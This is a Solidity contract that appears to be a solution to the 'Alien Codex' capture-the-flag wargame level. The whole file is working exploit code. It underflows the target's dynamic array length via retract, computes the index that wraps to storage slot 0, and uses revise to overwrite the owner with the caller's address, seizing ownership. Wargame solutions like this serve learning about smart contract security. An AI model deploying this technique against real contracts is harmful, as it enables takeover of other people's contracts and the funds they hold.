// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IAlienCodex {
    function owner() external view returns (address);
    function make_contact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodex {
    IAlienCodex alienCodexInstance;

    constructor(address _instanceAddress) {
        alienCodexInstance = IAlienCodex(_instanceAddress);
    }

    function attack() external {
        uint256 codexStart = uint256(keccak256(abi.encode(1)));
        alienCodexInstance.make_contact();
        alienCodexInstance.retract();
        alienCodexInstance.revise(type(uint256).max - codexStart + 1, bytes32(uint256(uint160(tx.origin))));
        require(alienCodexInstance.owner() == tx.origin, "Failed to take ownership");
    }
}
